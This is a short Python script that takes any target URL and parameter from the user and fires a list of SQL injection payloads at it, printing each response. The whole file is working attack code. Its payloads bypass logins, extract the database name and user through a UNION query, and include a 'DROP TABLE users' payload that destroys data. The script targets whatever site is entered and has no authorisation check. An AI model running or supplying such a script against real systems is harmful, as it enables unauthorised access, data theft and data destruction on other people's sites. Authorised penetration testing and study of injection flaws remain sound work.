import requests

url = input("Enter the target URL (e.g., http://example.com/login.php): ")
vulnerable_param = input("Enter the vulnerable parameter (e.g., username): ")

payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "'; DROP TABLE users; -- ",
    "' UNION SELECT null, null, null -- ",
    "' AND 1=0 UNION SELECT 1, database(), user() -- ",
]

def inject_sql(url, param, payload):
    params = {param: payload}
    try:
        response = requests.get(url, params=params)
        print(f"Payload: {payload}")
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}")
        print(f"Snippet: {response.text[:200]}")
    except Exception as e:
        print(f"Error: {e}")

print("\nStarting SQL Injection Test...\n")
for payload in payloads:
    inject_sql(url, vulnerable_param, payload)
